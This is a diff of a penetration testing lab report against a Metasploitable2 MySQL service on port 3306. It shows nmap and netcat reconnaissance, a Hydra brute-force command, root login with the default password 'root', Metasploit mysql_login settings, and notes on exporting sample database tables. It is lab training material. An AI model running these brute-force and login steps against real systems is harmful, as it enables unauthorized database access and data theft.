@@ -1,7 +1,7 @@
 Penetration Testing Report – Metasploitable2 (Port 3306 - MySQL)
 
 1. Test Date : 20-06-25
-    Test by : [ me ]
+    Test by : [ Nikhil ]
 2. Target Information
 - Target IP: 192.168.1.101
 - Service: MySQL
@@ -9,11 +9,18 @@ Penetration Testing Report – Metasploitable2 (Port 3306 - MySQL)
 - Database Version: MySQL 5.0.51a-3ubuntu5
 - Tools Used: Nmap, MySQL client, Metasploit, Hydra, sqlmap
 
-3. Reconnaissance
+Tables-content
+   1.Reconnaissance
+   2.Banner Grabbing(OS footprinting)
+   3.Enumeration
+   4.Exploitating
+   5.Post Exploitation
+
+Reconnaissance
 
 3.1 Nmap Scan
 Command:
-nmap -sV -p 3306 192.168.1.101
+nmap -sV -p 3306 192.168.1.101                       --more detail  ' nmap -h '
 
 Output:
 PORT     STATE SERVICE VERSION
@@ -26,7 +33,7 @@ An older version of MySQL is running. Version 5.0.51a is known to contain multip
 
 4.1 Banner Grabbing
 Command:
-nc 192.168.1.101 3306
+nc 192.168.1.101 3306                    --nc (netcat/ncat)
 
 Output:
 - Returns MySQL handshake
@@ -40,22 +47,18 @@ Common passwords: (blank), root, admin
 
 5.1 Brute Force with Hydra
 Command:
-hydra -L user.txt -P pass.txt 192.168.1.101 mysql
-
-Result:
-[3306][mysql] host: 192.168.1.101   login: root   password: root
+hydra -L user.txt -P pass.txt 192.168.1.101 mysql          --for more run ' hydra -h '
 
 5.2 MySQL Client Access
 Command:
-mysql -h 192.168.1.101 -u root -p
+mysql -h 192.168.1.101 -u root -p       
 Password: root
 
-Result:
-- Access to MySQL CLI as root
-- Full access to all databases
-
-5.3 Metasploit Module (MySQL Login)
+if automate the all task than 5.3  
+ 
+5.3 Metasploit Module (MySQL Login)               
 msfconsole
+search -What your found-
 use auxiliary/scanner/mysql/mysql_login
 set RHOSTS 192.168.1.101
 set USERNAME root
@@ -78,6 +81,10 @@ Findings:
 
 6. Post-Exploitation
 
+Result:
+- Access to MySQL CLI as root
+- Full access to all databases
+
 Data Exfiltration:
 - Exported user tables from `dvwa`, `mutillidae`, and other sample databases
 - Found default credentials reused across apps
@@ -97,4 +104,6 @@ Privilege Escalation:
 
 8. Conclusion
 
-Port 3306 on 192.168.1.101 was hosting a vulnerable MySQL instance with default root credentials. Full database access was obtained, resulting in sensitive data exposure and potential further exploitation. This emphasizes the critical importance of hardening database configurations and credentials.
+Port 3306 on 192.168.1.101 was hosting a vulnerable MySQL instance with default root credentials.
+Full database access was obtained, resulting in sensitive data exposure and potential further exploitation.
+This emphasizes the critical importance of hardening database configurations and credentials.
